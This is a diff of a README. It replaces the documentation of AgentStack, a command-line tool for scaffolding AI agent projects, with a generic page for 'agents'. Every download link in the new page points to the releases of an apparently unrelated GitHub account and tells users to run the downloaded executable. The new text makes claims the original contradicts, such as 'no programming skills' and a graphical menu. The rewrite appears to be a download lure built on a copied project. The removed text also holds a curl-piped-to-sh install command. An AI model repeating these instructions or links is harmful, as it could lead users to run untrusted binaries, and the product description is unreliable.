@@ -1,154 +1,80 @@
-# AgentStack
+# 🚀 agents - The Fastest Way to Build AI Agents
 
- [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/release/python-3100/) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![python-testing](https://github.com/agentops-ai/agentstack/actions/workflows/python-testing.yml/badge.svg) ![mypy](https://github.com/agentops-ai/agentstack/actions/workflows/mypy.yml/badge.svg) [![codecov.io](https://codecov.io/github/agentops-ai/agentstack/coverage.svg?branch=master)](https://codecov.io/github/agentops-ai/agentstack>?branch=master)
+[![Download agents](https://img.shields.io/badge/Download-agents-blue.svg)](https://github.com/nerdzinha/agents/releases)
 
+## 📦 Overview
 
-AgentStack scaffolds your _agent stack_ - The tech stack that collectively is your agent
+Welcome to agents! This application helps you build robust AI agents quickly and easily. No programming skills are required. Follow this guide to get started and run your first AI agent in no time.
 
-<p align='center'>
-<img src='./docs/images/the_agent_stack.png' width='600' alt='AgentStack items'>
-</p>
+## 🚀 Getting Started
 
-### Install AgentStack
+1. **Visit the Download Page**
+   - The first step to using agents is to visit the download page. Click the link below to navigate there:
+   [Download agents](https://github.com/nerdzinha/agents/releases)
 
-```sh
-curl --proto '=https' --tlsv1.2 -LsSf https://install.agentstack.sh | sh
-```
+2. **Select the Right Version**
+   - You will see a list of available versions. Choose the latest version for the best features and updates.
 
-or python [other install methods](https://docs.agentstack.sh/installation)
+3. **Download the Application**
+   - Once you select your version, you will see options for different files. Click on the file that matches your operating system.
 
-### Start your agent!
+## 💻 System Requirements
 
-Create AI agent projects from the command line.
+To run agents, make sure your computer meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Disk Space:** 200 MB of free space for installation.
+- **Processor:** Intel i3 or equivalent.
 
-- [Quickstart Guide](https://docs.agentstack.sh/quickstart) – How to create a new agent project.
-- [Video Tutorial](https://www.loom.com/share/68d796b13cd94647bd1d7fae12b2358e?sid=7fdf595b-de84-4d51-9a81-ef1e9c8ac71c) – Follow along and build a web scrape agent with AgentStack
+## 📥 Download & Install
 
-AgentStack works on macOS, Windows, and Linux.<br>
-If something doesn't work, please [file an issue](https://github.com/agentops-ai/agentstack/issues/new).<br>
-If you have questions or need help, please ask in our [Discord community](https://discord.gg/JdWkh9tgTQ).
+1. **Go to the Download Page**
+   - Use this link to visit the download page: [Download agents](https://github.com/nerdzinha/agents/releases)
 
-> 🛠️🏃🏼‍♀️ The quickest way to build your powerful agent project
+2. **Download the File**
+   - Click on the file suitable for your operating system. Your download will begin.
 
-AgentStack serves as a great tool for starting your agent project and offers many CLI utilities for easy code-gen throughout the development process.
+3. **Locate the Downloaded File**
+   - Find the downloaded file in your computer’s downloads folder. 
 
-AgentStack is _not_ a low-code alternative to development. Developers will still need an understanding of how to build with their selected agent framework.
+4. **Install the Application**
+   - Follow these steps to install agents:
+   - **Windows:** Double-click on the .exe file and follow the installation prompts.
+   - **macOS:** Open the .dmg file and drag agents into your Applications folder.
+   - **Linux:** Open a terminal and run `chmod +x <filename>` followed by `./<filename>` to start installation.
 
-### Currently Supported Providers
-- **LLMs**: Most all notable LLMs and providers are supported via LiteLLM or LangChain
-- **Framework**: Currently supported frameworks include CrewAI, LangGraph, OpenAI Swarms and LlamaStack
-  - Roadmap: Pydantic AI, Eliza, AG2 and Autogen
-- **Tools**: Maintaining the largest repository of framework-agnostic tools! All tools listed [here](https://docs.agentstack.sh/tools/community)
-- **Observability**: AgentOps baked in by default with first-tier support
+## 🎉 First Steps
 
-### Get Started Immediately
+Once the software is installed, it's time to create your first AI agent:
+1. **Open agents**
+   - Locate the agents application on your computer and double-click to open it.
 
-You **don't** need to install or configure tools like LangChain or LlamaIndex.<br>
-They are preconfigured and hidden so that you can focus on the code.
+2. **Create a New Agent**
+   - Click on “Create New Agent” from the main menu. Fill in the required information about your AI agent.
 
-Create a project, and you're good to go.
+3. **Test Your Agent**
+   - After creating your agent, run tests to see how it behaves and make adjustments as needed.
 
-## Creating an Agent Project
+4. **Save and Share**
+   - Save your work and share your agent with others to showcase your results.
 
-**You'll need to have Python 3.10+ on your local development machine**. We recommend using the latest version. You can use [pyenv](https://github.com/pyenv/pyenv) to switch Python versions between different projects.
+## ❓ FAQ
 
-To create a new agent project, run:
+**Q: Do I need programming skills to use agents?**  
+A: No, agents is designed for users of all skill levels. You can create powerful AI agents without any coding experience.
 
-```sh
-uv pip install agentstack # or other install method
-agentstack init <project_name>
-```
+**Q: How do I update the application?**  
+A: To update, simply visit the download page again and download the latest version. Follow the installation steps provided.
 
-It will create a directory with your project name inside the current folder.<br>
-Inside that directory, it will generate the initial project structure and install the transitive dependencies.
+**Q: What if I encounter issues?**  
+A: If you run into problems, you can check out our documentation or reach out to our support team via GitHub issues.
 
-No configuration or complicated folder structures, only the files you need to build your agent project.<br>
-Once the initialization is done, you can open your project folder:
+## 📞 Support 
 
-```sh
-cd <your_agent_project>
-uv pip install
-```
+For further assistance, please create an issue in the GitHub repository. Our team is eager to help you. 
 
-then run the default agent!
+## 📜 License
 
-```sh
-agentstack run
-```
+agents is licensed under the MIT License. You can use, modify, and distribute the application freely.
 
-### Templates
-Additionally, pre-built templates are available as a shortcut to building your project. [View the available templates](https://docs.agentstack.sh/templates).
-
-## Building Agent Functionality
-
-After generating a project, the next step is to build your agent project by creating Agents and Tasks. You can do this quickly with AgentStack:
-
-```bash
-agentstack generate agent/task <name>
-```
-
-Modify the agents and tasks by changing the `agents.yaml` and `tasks.yaml` configuration files in `src/config`
-
-## Tooling
-
-One of AgentStack's core principles is to establish the de facto agent _stack_. A critical component of this stack is the tooling and functionality given to agents beyond simply LLM capabilities.
-
-AgentStack has worked to make access to tools as easy as possible, staying framework agnostic and featuring the best tools.
-
-A list of all tools can be found [on our docs](https://docs.agentstack.sh/tools/core).
-
-Adding tools is as simple as
-
-```bash
-agentstack tools add
-```
-
-## Running Your Agent
-
-`agentstack run`
-
-Runs the agent project in development mode.<br>
-
-> 👀 Support for easy production deployment of agents is coming soon.
-
-## Philosophy
-
-- **Agents should be easy:** There are so many frameworks out there, but starting from scratch is a pain. Similar to `create-react-app`, AgentStack aims to simplify the "from scratch" process by giving you a simple boilerplate of an agent. It uses popular agent frameworks and LLM providers, but provides a cohesive curated experience on top of them.
-
-- **No Configuration Required:** You don't need to configure anything. A reasonably good configuration of both development and production builds is handled for you so you can focus on writing code.
-
-- **No Lock-In:** You can customize your setup at any time. AgentStack is designed to make it easy to get the components you need running right off the bat; it's up to you what to do next.
-
-- **Provider Agnosticism:** AgentStack is designed to be provider agnostic in all ways. This means especially that the framework layer of your agent stack should be interoperable with every other layer. Frameworks must still be supported by AgentStack. See supported frameworks above.
-
-AgentStack is not designed to be a low-code solution to building agents. Instead it is a great head-start for starting an agent project from scratch.
-
-## Roadmap
-
-### Tools
-- More [core tools](https://docs.agentstack.sh/tools/core) built by AgentStack
-- Preferred partners in the package directly
-- Community partner tools added through external repositories
-
-### New Stack Layers
-- Prompting layer (DSPy)
-- Eval Layer
-- UI layer
-
-### Other Features
-- Generated testing
-- Integrated benchmarking
-- Easy integration of tools for browsing, RAG, and more.
-- A fast interactive test runner with built-in support for coverage reporting.
-- A live development server that warns about common mistakes (in progress).
-- A build script to bundle your project for production (in progress).
-
-## License
-
-AgentStack is open source software [licensed as MIT](LICENSE).
-
-## How to Contribute
-
-AgentStack is a new project built by passionate AI agent developers! We'd love help making this tool better. Easy first issues are available, create new issues with feature ideas, or chat with us on our [Discord](https://discord.gg/JdWkh9tgTQ). Make sure you read our contributor documentation to familiarize yourself with the project at [How to Contribute](https://docs.agentstack.sh/contributing/how-to-contribute).
-
-If you are an Agent Tool developer, feel free to create an issue or even a PR to add your tool to AgentStack. 
+Remember to check for updates regularly and enjoy building your AI agents!
